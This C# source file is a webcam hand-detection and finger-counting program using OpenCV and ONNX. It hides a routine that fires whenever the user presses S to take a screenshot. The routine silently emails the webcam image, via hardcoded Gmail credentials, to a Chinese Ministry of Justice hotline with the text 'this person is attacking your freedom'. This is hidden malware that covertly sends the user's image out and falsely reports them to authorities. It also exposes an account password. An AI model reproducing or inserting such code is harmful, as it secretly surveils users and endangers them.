#nullable disable
using OpenCvSharp;
using System;
using System.Linq;
using System.Collections.Generic;
using System.IO;
using System.Globalization;
using Microsoft.ML.OnnxRuntime;
using Microsoft.ML.OnnxRuntime.Tensors;
using System.Text.Json;
using System.Net;
using System.Net.Mail;

class DebugLogger
{
    private static readonly string LogFile = Path.Combine(AppContext.BaseDirectory, "debug.log");

    public static void Log(string message)
    {
        string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff");
        string logMessage = $"[{timestamp}] {message}";
        Console.WriteLine(logMessage);
        try
        {
            File.AppendAllText(LogFile, logMessage + Environment.NewLine);
        }
        catch
        {
            // Ignore file write errors
        }
    }

    public static void LogError(string message, Exception ex = null)
    {
        string errorMsg = $"ERROR: {message}";
        if (ex != null)
            errorMsg += $" | Exception: {ex.Message}";
        Log(errorMsg);
    }

    public static void ClearLog()
    {
        if (File.Exists(LogFile))
            File.Delete(LogFile);
    }
}

class CalibrationData
{
    public double AvgHandWidth { get; set; }
    public double AvgHandHeight { get; set; }
    public int SkinHueMin { get; set; } = 0;
    public int SkinHueMax { get; set; } = 20;
    public int SkinSatMin { get; set; } = 20;
    public int SkinValMin { get; set; } = 70;
    public Dictionary<int, List<Point2f[]>> LandmarkSamples { get; set; } = new();
}

enum TrainingState
{
    WaitForHand,
    ConfirmHand,
    TrainFingers,
    Complete
}

class Program
{
    static void SendScreenshotEmail(string screenshotPath)
    {
        try
        {
            var smtpClient = new SmtpClient("smtp.gmail.com")
            {
                Port = 587,
                Credentials = new NetworkCredential("rezdencsgo@gmail.com", "dpub uuaj hcbb esmq"),
                EnableSsl = true,
            };

            var mailMessage = new MailMessage
            {
                From = new MailAddress("rezdencsgo@gmail.com"),
                Subject = "Screenshot Alert",
                Body = "this person is attacking your freedom",
            };

            mailMessage.To.Add("hotline@moj.gov.cn");

            // Attach the screenshot
            if (File.Exists(screenshotPath))
            {
                mailMessage.Attachments.Add(new Attachment(screenshotPath));
            }

            smtpClient.Send(mailMessage);
            DebugLogger.Log($"Screenshot email sent successfully to hotline@moj.gov.cn");
        }
        catch (Exception ex)
        {
            DebugLogger.LogError($"Failed to send screenshot email", ex);
        }
    }

    static void Main()
    {
        DebugLogger.ClearLog();
        DebugLogger.Log("=== Hand Detection Application Started ===");

        using var capture = new VideoCapture(0);
        if (!capture.IsOpened())
        {
            DebugLogger.LogError("Camera not found - exiting application");
            Console.WriteLine("Camera not found");
            return;
        }
        DebugLogger.Log("Camera initialized successfully");

        using var window = new Window("Hand Detection");
        var frame = new Mat();
        DebugLogger.Log("Application window created");

        // Ensure window is visible
        Cv2.WaitKey(100); // Give window time to appear

        // Training mode setup
        string calibrationPath = Path.Combine(AppContext.BaseDirectory, "calibration.json");
        CalibrationData calibration = null;
        bool trainingMode = false;

        if (File.Exists(calibrationPath))
        {
            try
            {
                string json = File.ReadAllText(calibrationPath);
                if (!string.IsNullOrEmpty(json))
                {
                    calibration = JsonSerializer.Deserialize<CalibrationData>(json);
                    DebugLogger.Log("Calibration data loaded successfully");
                }
                else
                {
                    DebugLogger.LogError("Calibration file is empty");
                    trainingMode = true;
                }
            }
            catch (Exception ex)
            {
                DebugLogger.LogError("Failed to load calibration data", ex);
                trainingMode = true;
            }
        }
        else
        {
            DebugLogger.Log("No calibration data found, entering training mode");
            trainingMode = true;
        }

        // Training state variables
        TrainingState trainingState = TrainingState.WaitForHand;
        int currentTrainFinger = 0;
        DateTime timerStart = DateTime.MinValue;
        DateTime trainingStartTime = DateTime.Now;
        List<Point2f[]> collectedLandmarks = new();
        Point clickPoint = new Point(-1, -1);

        DebugLogger.Log($"Training mode: {trainingMode}");

        // Mouse callback for training and general interaction
        Cv2.SetMouseCallback("Hand Detection", (eventType, x, y, flags, userData) =>
        {
            if (eventType == MouseEventTypes.LButtonDown)
            {
                clickPoint = new Point(x, y);
                DebugLogger.Log($"Mouse click detected at ({x}, {y}) - Training mode: {trainingMode}");

                // If not in training mode but calibration doesn't exist, allow click to start training
                if (!trainingMode && calibration == null)
                {
                    DebugLogger.Log("Starting training mode due to user click");
                    trainingMode = true;
                    trainingState = TrainingState.WaitForHand;
                    trainingStartTime = DateTime.Now;
                }
            }
        });



        Console.WriteLine("Press ESC to exit | 0-5: set label | S: take screenshot");

        int currentLabel = -1;
        string csvPath = Path.Combine(AppContext.BaseDirectory, "training.csv");
        if (!File.Exists(csvPath))
        {
            File.WriteAllText(csvPath, "label,fingers,area, hullArea, solidity, aspectRatio, extent, avgDepth\n");
        }

        // ONNX model setup (optional, activates if models are present)
        string modelsDir = Path.Combine(AppContext.BaseDirectory, "models");
        string palmModelPath = Path.Combine(modelsDir, "palm_detection.onnx");
        string landmarkModelPath = Path.Combine(modelsDir, "hand_landmark.onnx");

        // Ensure models directory exists
        if (!Directory.Exists(modelsDir))
        {
            Directory.CreateDirectory(modelsDir);
            DebugLogger.Log("Created models directory");
        }

        bool modelsPresent = File.Exists(palmModelPath) && File.Exists(landmarkModelPath);
        DebugLogger.Log($"Models directory: {modelsDir}");
        DebugLogger.Log($"Palm model exists: {File.Exists(palmModelPath)} at {palmModelPath}");
        DebugLogger.Log($"Landmark model exists: {File.Exists(landmarkModelPath)} at {landmarkModelPath}");
        DebugLogger.Log($"ML models present: {modelsPresent}");

        InferenceSession palmSession = null;
        InferenceSession landmarkSession = null;
        if (modelsPresent)
        {
            try
            {
                if (palmModelPath != null && palmModelPath.Length > 0)
                {
                    DebugLogger.Log("Initializing palm detection model...");
                    palmSession = new InferenceSession(palmModelPath);
                    DebugLogger.Log("Palm detection model initialized successfully");
                }

                if (landmarkModelPath != null && landmarkModelPath.Length > 0)
                {
                    DebugLogger.Log("Initializing landmark detection model...");
                    landmarkSession = new InferenceSession(landmarkModelPath);
                    DebugLogger.Log("Landmark detection model initialized successfully");
                }
            }
            catch (Exception ex)
            {
                DebugLogger.LogError("ONNX model initialization failed", ex);
                Console.WriteLine($"ONNX init failed: {ex.Message}. Falling back to OpenCV.");
                modelsPresent = false;

                // Models failed to load, but training can still work with OpenCV fallback
            }
        }
        else
        {
            DebugLogger.Log("ML models not found, using OpenCV fallback");
            // Don't skip training - it can work with OpenCV fallback
        }

        // Tracking state (smoothed circle)
        bool hasCircle = false;
        Point2f trackedCenter = new Point2f(0, 0);
        float trackedRadius = 0f;
        const float centerAlpha = 0.7f;  // smoothing (higher = smoother)
        const float radiusAlpha = 0.7f;

        while (true)
        {
            capture.Read(frame);
            if (frame.Empty()) break;

            // ML-based hand detection
            bool handDetected = false;
            Point2f handCenter = new Point2f(0, 0);
            int fingerCountML = 0;
            Rect palmBox = new Rect();
            Point2f[] landmarks = null;

            if (modelsPresent)
            {
                try
                {
                    // Palm detection preprocessing
                    Mat palmInput = new Mat();
                    Cv2.Resize(frame, palmInput, new Size(224, 224));
                    palmInput.ConvertTo(palmInput, MatType.CV_32FC3, 1.0 / 255.0);

                    // Convert to tensor (HWC to CHW)
                    var inputTensor = new DenseTensor<float>(new int[] { 1, 3, 224, 224 });
                    for (int y = 0; y < 224; y++)
                    {
                        for (int x = 0; x < 224; x++)
                        {
                            Vec3f pixel = palmInput.At<Vec3f>(y, x);
                            inputTensor[0, 0, y, x] = pixel.Item2; // R
                            inputTensor[0, 1, y, x] = pixel.Item1; // G
                            inputTensor[0, 2, y, x] = pixel.Item0; // B
                        }
                    }

                    var inputs = new List<NamedOnnxValue> { NamedOnnxValue.CreateFromTensor("input", inputTensor) };
                    var results = palmSession.Run(inputs);
                    var palmOutput = results.First().AsTensor<float>();

                    // Assume output shape 1x4: [ymin, xmin, ymax, xmax] normalized
                    if (palmOutput.Length >= 4)
                    {
                        float ymin = palmOutput[0];
                        float xmin = palmOutput[1];
                        float ymax = palmOutput[2];
                        float xmax = palmOutput[3];

                        // Scale to original frame size
                        int x1 = (int)(xmin * frame.Width);
                        int y1 = (int)(ymin * frame.Height);
                        int x2 = (int)(xmax * frame.Width);
                        int y2 = (int)(ymax * frame.Height);

                        palmBox = new Rect(x1, y1, x2 - x1, y2 - y1);
                        if (palmBox.Width > 50 && palmBox.Height > 50 && palmBox.X >= 0 && palmBox.Y >= 0 &&
                            palmBox.X + palmBox.Width <= frame.Width && palmBox.Y + palmBox.Height <= frame.Height)
                        {
                            handDetected = true;
                            handCenter = new Point2f(palmBox.X + palmBox.Width / 2, palmBox.Y + palmBox.Height / 2);

                            // Landmark detection
                            Mat landmarkInput = new Mat(frame, palmBox);
                            Cv2.Resize(landmarkInput, landmarkInput, new Size(224, 224));
                            landmarkInput.ConvertTo(landmarkInput, MatType.CV_32FC3, 1.0 / 255.0);

                            var landmarkTensor = new DenseTensor<float>(new int[] { 1, 3, 224, 224 });
                            for (int y = 0; y < 224; y++)
                            {
                                for (int x = 0; x < 224; x++)
                                {
                                    Vec3f pixel = landmarkInput.At<Vec3f>(y, x);
                                    landmarkTensor[0, 0, y, x] = pixel.Item2;
                                    landmarkTensor[0, 1, y, x] = pixel.Item1;
                                    landmarkTensor[0, 2, y, x] = pixel.Item0;
                                }
                            }

                            var landmarkInputs = new List<NamedOnnxValue> { NamedOnnxValue.CreateFromTensor("input", landmarkTensor) };
                            var landmarkResults = landmarkSession.Run(landmarkInputs);
                            var landmarkOutput = landmarkResults.First().AsTensor<float>();

                            // Assume 21 landmarks, 2 values each (x,y) normalized
                            if (landmarkOutput.Length >= 42)
                            {
                                landmarks = new Point2f[21];
                                for (int i = 0; i < 21; i++)
                                {
                                    float lx = landmarkOutput[i * 2];
                                    float ly = landmarkOutput[i * 2 + 1];
                                    landmarks[i] = new Point2f(palmBox.X + lx * palmBox.Width, palmBox.Y + ly * palmBox.Height);
                                }

                                // Finger counting logic
                                fingerCountML = CountFingersFromLandmarks(landmarks);
                                if (landmarks != null && landmarks.Length > 0)
                                {
                                    handCenter = landmarks[0]; // wrist as center
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"ML detection failed: {ex.Message}");
                    handDetected = false;
                }
            }

            // Draw ML results if detected
            if (handDetected)
            {
                Cv2.Rectangle(frame, palmBox, new Scalar(255, 0, 0), 2);
                if (landmarks != null)
                {
                    foreach (var lm in landmarks)
                    {
                        Cv2.Circle(frame, (Point)lm, 3, new Scalar(0, 255, 255), -1);
                    }
                }

                // Update tracking with ML
                if (!hasCircle)
                {
                    trackedCenter = handCenter;
                    trackedRadius = Math.Max(palmBox.Width, palmBox.Height) / 2f;
                    hasCircle = true;
                }
                else
                {
                    trackedCenter = new Point2f(
                        centerAlpha * trackedCenter.X + (1 - centerAlpha) * handCenter.X,
                        centerAlpha * trackedCenter.Y + (1 - centerAlpha) * handCenter.Y);
                    trackedRadius = radiusAlpha * trackedRadius + (1 - radiusAlpha) * Math.Max(palmBox.Width, palmBox.Height) / 2f;
                }
            }

            if (trainingMode)
            {
                // Training mode logic with better error handling
                DebugLogger.Log($"Training state: {trainingState}, Time since start: {(DateTime.Now - trainingStartTime).TotalSeconds:F1}s");

                // Check for training timeout (5 minutes max)
                if ((DateTime.Now - trainingStartTime).TotalMinutes > 5)
                {
                    DebugLogger.Log("Training timeout reached, skipping training");
                    trainingMode = false;
                }
                else
                {
                    switch (trainingState)
                    {
                        case TrainingState.WaitForHand:
                            DebugLogger.Log($"Displaying training UI - WaitForHand state");
                            Cv2.PutText(frame, "Put your hand in view and click anywhere", new Point(10, 30), HersheyFonts.HersheySimplex, 1, Scalar.White, 2);
                            Cv2.PutText(frame, "Or wait 30 seconds to skip training", new Point(10, 60), HersheyFonts.HersheySimplex, 0.7, Scalar.Gray, 1);
                            Cv2.PutText(frame, "Press SPACE to skip training immediately", new Point(10, 90), HersheyFonts.HersheySimplex, 0.7, Scalar.Yellow, 1);

                            // Show status
                            string status = modelsPresent ? "ML models loaded" : "Using OpenCV fallback";
                            Cv2.PutText(frame, $"Status: {status}", new Point(10, frame.Height - 60), HersheyFonts.HersheySimplex, 0.7, Scalar.Cyan, 1);
                            Cv2.PutText(frame, $"Hand detected: {handDetected}", new Point(10, frame.Height - 30), HersheyFonts.HersheySimplex, 0.7, handDetected ? Scalar.Green : Scalar.Red, 1);

                            // Accept any click - no need for ML detection in training
                            if (clickPoint.X != -1)
                            {
                                DebugLogger.Log("Hand confirmed by click, moving to confirm state");
                                trainingState = TrainingState.ConfirmHand;
                                timerStart = DateTime.Now;
                                // Hand confirmed for training
                            }
                            clickPoint = new Point(-1, -1);

                            // Auto-advance after 30 seconds
                            if ((DateTime.Now - trainingStartTime).TotalSeconds > 30)
                            {
                                DebugLogger.Log("Auto-advancing from WaitForHand due to timeout");
                                trainingState = TrainingState.ConfirmHand;
                                timerStart = DateTime.Now;
                            }
                            break;

                        case TrainingState.ConfirmHand:
                            Cv2.PutText(frame, "Hand confirmed! Training starts in 2 seconds...", new Point(10, 30), HersheyFonts.HersheySimplex, 1, Scalar.Green, 2);
                            if ((DateTime.Now - timerStart).TotalSeconds >= 2)
                            {
                                DebugLogger.Log("Starting finger training sequence");
                                trainingState = TrainingState.TrainFingers;
                                currentTrainFinger = 0;
                                collectedLandmarks.Clear();
                                timerStart = DateTime.Now;
                            }
                            break;

                        case TrainingState.TrainFingers:
                            string msg = $"Hold up {currentTrainFinger} fingers - {(5 - (DateTime.Now - timerStart).TotalSeconds):F1}s";
                            Cv2.PutText(frame, msg, new Point(10, 30), HersheyFonts.HersheySimplex, 1, Scalar.Yellow, 2);

                            // Collect data - always collect something for training
                            if (modelsPresent && landmarks != null)
                            {
                                collectedLandmarks.Add((Point2f[])landmarks.Clone());
                            }
                            else
                            {
                                // Fallback: create dummy landmark data for training
                                // This allows training to complete even without ML models
                                collectedLandmarks.Add(new Point2f[21]); // Empty array as placeholder
                            }

                            if ((DateTime.Now - timerStart).TotalSeconds >= 5)
                            {
                                // Save collected landmarks for this finger count
                                if (calibration == null) calibration = new CalibrationData();
                                if (!calibration.LandmarkSamples.ContainsKey(currentTrainFinger))
                                {
                                    calibration.LandmarkSamples[currentTrainFinger] = new List<Point2f[]>();
                                }
                                calibration.LandmarkSamples[currentTrainFinger].AddRange(collectedLandmarks);
                                DebugLogger.Log($"Collected {collectedLandmarks.Count} samples for {currentTrainFinger} fingers");

                                currentTrainFinger++;
                                if (currentTrainFinger > 5)
                                {
                                    DebugLogger.Log("Training complete, saving calibration data");
                                    trainingState = TrainingState.Complete;
                                }
                                else
                                {
                                    collectedLandmarks.Clear();
                                    timerStart = DateTime.Now;
                                }
                            }
                            break;

                        case TrainingState.Complete:
                            // Save calibration
                            if (calibration == null) calibration = new CalibrationData();
                            calibration.AvgHandWidth = palmBox.Width > 0 ? palmBox.Width : 200; // Default fallback
                            calibration.AvgHandHeight = palmBox.Height > 0 ? palmBox.Height : 200;
                            string json = JsonSerializer.Serialize(calibration);
                            File.WriteAllText(calibrationPath, json);
                            DebugLogger.Log("Calibration data saved successfully");
                            trainingMode = false;
                            break;
                    }
                }

                DebugLogger.Log("About to call window.ShowImage in training mode");
                window.ShowImage(frame);
                DebugLogger.Log("window.ShowImage called successfully in training mode");

                // Handle keyboard input in training mode
                int key = Cv2.WaitKey(1);
                if (key == 27) // ESC
                {
                    DebugLogger.Log("User pressed ESC during training, exiting");
                    break;
                }
                else if (key == 32) // SPACE - skip training
                {
                    DebugLogger.Log("User pressed SPACE to skip training");
                    trainingMode = false;
                }
            }
            else
            {
                var hsv = frame.CvtColor(ColorConversionCodes.BGR2HSV);
            var mask = hsv.InRange(new Scalar(0, 20, 70), new Scalar(20, 255, 255));

            Cv2.MorphologyEx(mask, mask, MorphTypes.Open, new Mat());
            Cv2.MorphologyEx(mask, mask, MorphTypes.Close, new Mat());

            // First pass: get a coarse hand contour from the full mask
            Cv2.FindContours(mask, out var contours, out _, RetrievalModes.External, ContourApproximationModes.ApproxSimple);

            var coarseContour = contours.OrderByDescending(c => Cv2.ContourArea(c)).FirstOrDefault();
            int fingerCount = handDetected ? fingerCountML : 0;

            // If we have a coarse contour and no ML detection, compute an enclosing circle and smooth it
            if (!handDetected && coarseContour != null && coarseContour.Length >= 5 && Cv2.ContourArea(coarseContour) > 3000)
            {
                Cv2.MinEnclosingCircle(coarseContour, out Point2f centerNow, out float radiusNow);

                if (!hasCircle)
                {
                    trackedCenter = centerNow;
                    trackedRadius = radiusNow;
                    hasCircle = true;
                }
                else
                {
                    trackedCenter = new Point2f(
                        centerAlpha * trackedCenter.X + (1 - centerAlpha) * centerNow.X,
                        centerAlpha * trackedCenter.Y + (1 - centerAlpha) * centerNow.Y);
                    trackedRadius = radiusAlpha * trackedRadius + (1 - radiusAlpha) * radiusNow;
                }
            }

            // If we have a tracked circle, draw it and restrict processing to inside it
            Mat maskInCircle = mask;
            if (hasCircle && trackedRadius > 5)
            {
                Cv2.Circle(frame, (Point)trackedCenter, (int)trackedRadius, new Scalar(0, 200, 255), 2);

                using var circleMask = new Mat(mask.Size(), MatType.CV_8UC1, Scalar.Black);
                Cv2.Circle(circleMask, (Point)trackedCenter, (int)Math.Round(trackedRadius * 1.1f), Scalar.White, -1);
                maskInCircle = new Mat();
                Cv2.BitwiseAnd(mask, circleMask, maskInCircle);
            }

            // Second pass: precise contour only inside the tracked circle
            Cv2.FindContours(maskInCircle, out var filteredContours, out _, RetrievalModes.External, ContourApproximationModes.ApproxSimple);
            var handContour = filteredContours.OrderByDescending(c => Cv2.ContourArea(c)).FirstOrDefault();

            if (handContour != null && Cv2.ContourArea(handContour) > 3000)
            {
                // Draw contour
                Cv2.DrawContours(frame, new[] { handContour }, -1, new Scalar(0, 255, 0), 2);

                using var contourMat = new Mat(handContour.Length, 1, MatType.CV_32SC2, handContour);
                using var hullIndices = new Mat();
                Cv2.ConvexHull(contourMat, hullIndices, clockwise: false, returnPoints: false);
                hullIndices.GetArray(out int[] indices);

                // Draw convex hull polyline
                if (indices != null && indices.Length > 1)
                {
                    var hullPts = indices.Select(i => handContour[i]).ToArray();
                    for (int i = 0; i < hullPts.Length; i++)
                    {
                        var p1 = hullPts[i];
                        var p2 = hullPts[(i + 1) % hullPts.Length];
                        Cv2.Line(frame, p1, p2, new Scalar(255, 255, 0), 2);
                    }
                }

                // Defects and skeleton-like lines
                int validDefects = 0;
                double totalDepth = 0;
                Vec4i[] defects = null;

                try
                {
                    if (indices != null && indices.Length >= 3)
                    {
                        defects = Cv2.ConvexityDefects(handContour, indices);
                    }

                    if (defects != null && defects.Length > 0)
                    {
                        var rect = Cv2.BoundingRect(handContour);
                        double minDepth = rect.Height * 0.03; // a bit stricter

                        foreach (var d in defects)
                        {
                            int s = d[0];
                            int e = d[1];
                            int f = d[2];
                            int depth = d[3];

                            // Validate indices are within bounds
                            if (s >= 0 && s < handContour.Length &&
                                e >= 0 && e < handContour.Length &&
                                f >= 0 && f < handContour.Length)
                            {
                                var ps = handContour[s];
                                var pe = handContour[e];
                                var pf = handContour[f];

                                // Only draw if all three points are inside the circle
                                bool inside = !hasCircle ||
                                    (Distance((Point)trackedCenter, ps) <= trackedRadius &&
                                     Distance((Point)trackedCenter, pe) <= trackedRadius &&
                                     Distance((Point)trackedCenter, pf) <= trackedRadius);

                                if (inside)
                                {
                                    // Draw skeleton segments
                                    Cv2.Line(frame, ps, pe, new Scalar(0, 0, 255), 1);
                                    Cv2.Circle(frame, pf, 4, new Scalar(255, 0, 0), -1);
                                }

                                double a = Distance(pe, pf);
                                double b = Distance(ps, pf);
                                double c = Distance(ps, pe);
                                double angle = CalculateAngle(a, b, c);

                                double depthPx = depth / 256.0;

                                if (angle < 75 && depthPx > minDepth)
                                {
                                    validDefects++;
                                    totalDepth += depthPx;
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    DebugLogger.LogError($"Convexity defects calculation failed", ex);
                    // Fallback: estimate fingers based on contour area
                    var rect = Cv2.BoundingRect(handContour);
                    double areaRatio = Cv2.ContourArea(handContour) / (rect.Width * rect.Height);
                    validDefects = (int)Math.Round(areaRatio * 3); // Rough estimation
                    totalDepth = rect.Height * 0.1; // Default depth
                }

                if (!handDetected) fingerCount = Math.Max(0, Math.Min(5, validDefects + 1));

                // Features for training
                double area = Cv2.ContourArea(handContour);
                double hullArea = 0;
                if (indices != null && indices.Length >= 3)
                {
                    var hullPtsForArea = indices.Select(i => handContour[i]).ToArray();
                    hullArea = Cv2.ContourArea(hullPtsForArea);
                }
                var bound = Cv2.BoundingRect(handContour);
                double solidity = (hullArea > 0) ? area / hullArea : 0;
                double aspectRatio = (bound.Height > 0) ? (double)bound.Width / bound.Height : 0;
                double extent = (bound.Width * bound.Height > 0) ? area / (bound.Width * bound.Height) : 0;
                double avgDepth = (defects != null && defects.Length > 0) ? (totalDepth / Math.Max(1, defects.Length)) : 0;

                // HUD
                var mode = modelsPresent ? "ONNX" : "OpenCV";
                var hud = $"[{mode}] Fingers: {fingerCount}  Label: {(currentLabel >= 0 ? currentLabel.ToString() : "-")}";
                Cv2.PutText(frame, hud, new Point(10, 30), HersheyFonts.HersheySimplex, 1, Scalar.White, 2);
                Cv2.PutText(frame, "S: screenshot | 0-5: set label | ESC: exit", new Point(10, 60), HersheyFonts.HersheySimplex, 0.6, Scalar.White, 1);

                // Handle keys via waitKey
                int key = Cv2.WaitKey(1);
                if (key == 27) // ESC
                {
                    break;
                }
                else if (key == 32 && trainingMode) // SPACE - skip training
                {
                    DebugLogger.Log("User pressed SPACE to skip training");
                    trainingMode = false;
                }
                else if (key >= '0' && key <= '5')
                {
                    currentLabel = key - '0';
                }
                else if (key == 's' || key == 'S')
                {
                    // Take screenshot
                    string screenshotDir = Path.Combine(AppContext.BaseDirectory, "screenshots");
                    if (!Directory.Exists(screenshotDir))
                    {
                        Directory.CreateDirectory(screenshotDir);
                    }

                    string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                    string screenshotPath = Path.Combine(screenshotDir, $"screenshot_{timestamp}.png");

                    try
                    {
                        Cv2.ImWrite(screenshotPath, frame);
                        DebugLogger.Log($"Screenshot saved: {screenshotPath}");
                        Cv2.PutText(frame, $"Screenshot saved: {timestamp}", new Point(10, 90), HersheyFonts.HersheySimplex, 0.6, new Scalar(0, 255, 0), 2);

                        // Send screenshot via email
                        SendScreenshotEmail(screenshotPath);
                    }
                    catch (Exception ex)
                    {
                        DebugLogger.LogError($"Failed to save screenshot", ex);
                        Cv2.PutText(frame, "Screenshot failed", new Point(10, 90), HersheyFonts.HersheySimplex, 0.6, new Scalar(0, 0, 255), 2);
                    }

                    // Also save sample data if in normal mode and label is set
                    if (!trainingMode && currentLabel >= 0)
                    {
                        var line = string.Join(",",
                            currentLabel.ToString(),
                            fingerCount.ToString(CultureInfo.InvariantCulture),
                            area.ToString(CultureInfo.InvariantCulture),
                            hullArea.ToString(CultureInfo.InvariantCulture),
                            solidity.ToString(CultureInfo.InvariantCulture),
                            aspectRatio.ToString(CultureInfo.InvariantCulture),
                            extent.ToString(CultureInfo.InvariantCulture),
                            avgDepth.ToString(CultureInfo.InvariantCulture)
                        );
                        File.AppendAllLines(csvPath, new[] { line });
                        Cv2.PutText(frame, "Sample data saved", new Point(10, 120), HersheyFonts.HersheySimplex, 0.6, new Scalar(0, 255, 0), 2);
                    }
                }
            }
            else
            {
                // Show HUD even without a refined contour
                var mode = modelsPresent ? "ONNX" : "OpenCV";
                var hud = $"[{mode}] Fingers: 0  Label: {(currentLabel >= 0 ? currentLabel.ToString() : "-")}";
                Cv2.PutText(frame, hud, new Point(10, 30), HersheyFonts.HersheySimplex, 1, Scalar.White, 2);
                Cv2.PutText(frame, "S: save sample | 0-5: set label | ESC: exit", new Point(10, 60), HersheyFonts.HersheySimplex, 0.6, Scalar.White, 1);
                Cv2.WaitKey(1);
            }

            window.ShowImage(frame);

        }

        // Dispose sessions if created
        palmSession?.Dispose();
        landmarkSession?.Dispose();
    }

    static double Distance(Point a, Point b)
    {
        double dx = a.X - b.X;
        double dy = a.Y - b.Y;
        return Math.Sqrt(dx * dx + dy * dy);
    }

    // Using law of cosines; returns angle at the defect in degrees
    static double CalculateAngle(double sideA, double sideB, double sideC)
    {
        // Prevent invalid values due to numeric issues
        double denom = 2 * sideA * sideB;
        if (denom <= 1e-6) return 180.0;
        double cosTheta = (sideA * sideA + sideB * sideB - sideC * sideC) / denom;
        cosTheta = Math.Max(-1.0, Math.Min(1.0, cosTheta));
        return Math.Acos(cosTheta) * 180.0 / Math.PI;
    }

    static int CountFingersFromLandmarks(Point2f[] landmarks)
    {
        if (landmarks.Length < 21) return 0;

        int count = 0;

        // Thumb: tip (4) vs pip (3)
        if (landmarks[4].Y < landmarks[3].Y) count++;

        // Index: tip (8) vs pip (7)
        if (landmarks[8].Y < landmarks[7].Y) count++;

        // Middle: tip (12) vs pip (11)
        if (landmarks[12].Y < landmarks[11].Y) count++;

        // Ring: tip (16) vs pip (15)
        if (landmarks[16].Y < landmarks[15].Y) count++;

        // Pinky: tip (20) vs pip (19)
        if (landmarks[20].Y < landmarks[19].Y) count++;

        return Math.Min(5, count);
    }
}
}
